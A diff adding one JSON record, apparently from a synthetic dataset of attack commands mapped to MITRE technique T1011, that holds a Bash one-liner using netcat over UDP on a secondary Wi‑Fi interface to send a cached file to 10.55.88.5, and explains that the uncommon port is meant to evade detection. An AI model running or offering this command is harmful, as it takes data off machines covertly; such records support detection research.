@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
+  "explanation": "Exfiltrates data via a secondary Wi\u2011Fi interface using UDP to an uncommon port, aligning with T1011 by using a network medium (wlan1) distinct from the primary channel. iwconfig is used for monitoring the interface before transmission.",
+  "rationale_steps": [
+    "Verify availability of the alternate Wi\u2011Fi interface with iwconfig (monitoring only).",
+    "Bind netcat to the wlan1 source IP to force traffic over the distinct Wi\u2011Fi medium.",
+    "Send the file over UDP to an uncommon port to reduce detection without changing system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-4aaad84e",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
